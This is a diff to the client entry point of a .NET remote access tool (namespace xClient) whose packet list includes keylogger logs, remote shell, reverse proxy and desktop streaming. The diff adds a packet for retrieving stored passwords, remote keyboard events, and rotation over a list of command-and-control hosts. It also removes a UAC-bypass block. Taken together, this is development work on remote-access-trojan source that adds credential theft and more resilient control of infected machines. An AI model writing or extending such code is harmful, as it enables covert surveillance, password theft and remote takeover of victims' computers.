@@ -6,6 +6,7 @@ using System.Windows.Forms;
 using xClient.Config;
 using xClient.Core;
 using xClient.Core.Commands;
+using xClient.Core.Encryption;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
 using xClient.Core.Packets;
@@ -20,6 +21,7 @@ namespace xClient
         private static volatile bool _connected = false;
         private static Mutex _appMutex;
         private static ApplicationContext _msgLoop;
+        private static HostsManager _hosts;
 
         [STAThread]
         private static void Main(string[] args)
@@ -37,7 +39,6 @@ namespace xClient
 
         private static void Cleanup()
         {
-            CommandHandler.IsStreamingDesktop = false;
             CommandHandler.CloseShell();
             if (CommandHandler.StreamCodec != null)
                 CommandHandler.StreamCodec.Dispose();
@@ -53,7 +54,7 @@ namespace xClient
         {
             ConnectClient = new Client();
 
-            ConnectClient.AddTypesToSerializer(typeof (IPacket), new Type[]
+            ConnectClient.AddTypesToSerializer(new Type[]
             {
                 typeof (Core.Packets.ServerPackets.GetAuthentication),
                 typeof (Core.Packets.ServerPackets.DoClientDisconnect),
@@ -69,6 +70,7 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.GetDirectory),
                 typeof (Core.Packets.ServerPackets.DoDownloadFile),
                 typeof (Core.Packets.ServerPackets.DoMouseEvent),
+                typeof (Core.Packets.ServerPackets.DoKeyboardEvent),
                 typeof (Core.Packets.ServerPackets.GetSystemInfo),
                 typeof (Core.Packets.ServerPackets.DoVisitWebsite),
                 typeof (Core.Packets.ServerPackets.DoShowMessageBox),
@@ -84,8 +86,10 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.DoDownloadFileCancel),
                 typeof (Core.Packets.ServerPackets.GetKeyloggerLogs),
                 typeof (Core.Packets.ServerPackets.DoUploadFile),
+                typeof (Core.Packets.ServerPackets.GetPasswords),
                 typeof (Core.Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Core.Packets.ClientPackets.SetStatus),
+                typeof (Core.Packets.ClientPackets.SetStatusFileManager),
                 typeof (Core.Packets.ClientPackets.SetUserStatus),
                 typeof (Core.Packets.ClientPackets.GetDesktopResponse),
                 typeof (Core.Packets.ClientPackets.GetProcessesResponse),
@@ -97,6 +101,7 @@ namespace xClient
                 typeof (Core.Packets.ClientPackets.DoShellExecuteResponse),
                 typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
                 typeof (Core.Packets.ClientPackets.GetKeyloggerLogsResponse),
+                typeof (Core.Packets.ClientPackets.GetPasswordsResponse),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyData),
@@ -112,20 +117,13 @@ namespace xClient
         {
             Thread.Sleep(2000);
 
+            AES.PreHashKey(Settings.PASSWORD);
+            _hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
             SystemCore.OperatingSystem = SystemCore.GetOperatingSystem();
             SystemCore.MyPath = Application.ExecutablePath;
             SystemCore.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
             SystemCore.AccountType = SystemCore.GetAccountType();
             GeoLocationHelper.Initialize();
-
-            if (Settings.ENABLEUACESCALATION)
-            {
-                if (SystemCore.TryUacTrick())
-                    SystemCore.Disconnect = true;
-
-                if (SystemCore.Disconnect)
-                    return;
-            }
 
             if (!Settings.INSTALL || SystemCore.MyPath == SystemCore.InstallPath)
             {
@@ -174,7 +172,9 @@ namespace xClient
                 {
                     Thread.Sleep(100 + new Random().Next(0, 250));
 
-                    ConnectClient.Connect(Settings.HOST, Settings.PORT);
+                    Host host = _hosts.GetNextHost();
+
+                    ConnectClient.Connect(host.Hostname, host.Port);
 
                     Thread.Sleep(200);
 
